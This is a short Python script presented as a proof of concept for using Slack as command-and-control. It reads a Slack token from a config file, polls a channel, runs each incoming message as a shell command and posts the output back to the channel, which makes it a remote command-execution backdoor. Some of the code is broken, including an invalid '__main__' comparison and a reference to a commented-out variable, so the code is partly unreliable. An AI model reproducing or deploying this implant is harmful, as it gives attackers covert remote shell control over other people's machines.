import sys
import time
import json
import subprocess
import configparser
from slackclient import SlackClient

'''
Very basic PoC of slack as c2. I will work on this more over the weekend.

Usage:

python3 get_slacked.py /path/to/config.ini

Config.ini contents:

[Slack]
token=YOUR_TOKEN_GOES_HERE_WITHOUT_QUOTES
channel_id=YOUR_CHANNEL_ID_WITHOUT_QUOTES
username=testing
'''


# get the path to the config file from the first parameter
config_file_path = ''

if len(sys.argv) > 1:
    config_file_path = sys.argv[1]
else:
    print('Usage: %s /path/to/config.ini' % (sys.argv[0],))
    sys.exit()

config = configparser.ConfigParser()

# parse the content of the config file
with open(config_file_path, 'r') as f:
    config.read_file(f)

slack_token = config['Slack']['token']
slack_channel = config['Slack']['channel_id']
test_username = config['Slack']['username']

# Create SlackClient object named sc.
sc= SlackClient(slack_token)

def send_data(data):
    sc.api_call("chat.postMessage",
             channel=slack_channel,
             text=data
)

def pull_commands():
    while True:
        raw_commands = sc.rtm_read() # Retuns a dictionary in a list.

        if len(raw_commands) > 0:
            # To remove the dictionary from the list
            str_raw_commands = raw_commands[0]

            if len(str_raw_commands) > 3:

                # Fix Json
                j = json.loads(str(str_raw_commands).replace("'",'"'))
                # Execute command
                try:
                    if j['username'] != test_username:
                       # Will fail to find when message not from bot. When from bot, will not execute anyways...

                       # data = subprocess.run([j['text']], shell=True, stdout=subprocess.PIPE)

                        send_data(data.stdout)
                except:
                    data = subprocess.run([j['text']], shell=True, stdout=subprocess.PIPE)
                    send_data(data.stdout)


                #print('MESSAGE: ' + j['text'])
        time.sleep(.05)


pull_commands()


def main():
    # Basic connection vs rtm.start()
    print(sc.rtm_connect())
    pull_commands()

if __name__ = '__main__':
    main()
